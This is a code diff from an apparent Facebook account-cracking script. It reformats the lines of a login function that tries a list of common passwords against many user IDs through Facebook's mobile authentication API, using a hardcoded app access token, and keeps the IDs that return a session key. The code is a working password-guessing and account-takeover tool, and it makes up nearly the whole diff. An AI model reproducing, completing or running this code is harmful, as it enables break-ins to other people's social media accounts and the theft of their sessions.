@@ -137,7 +137,7 @@ def login(uid, meth):
     Session = requests.session()
     try:
         sys.stdout.write(
-            f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}PYC-XD\033[38;5;46m]~\x1b[1;97m{loop}-M{meth}\033[38;5;46m-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
+            f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}PYC-XD\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
         sys.stdout.flush()
         for pw in ["123456", "1234567", "12345678", "123456789", "password", "654321", "@#@#@#"]:
             if meth in ["1", "01", "A", "a"]:
@@ -155,7 +155,11 @@ def login(uid, meth):
                 "x-fb-http-engine": "Liger"}
             rp = Session.get(
                 "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
-                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
+                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type"
+                          "=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0"
+                          "&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos"
+                          ".headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728"
+                          "|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                 headers=headers).json()
             if "session_key" in rp:
                 oks.append(uid)
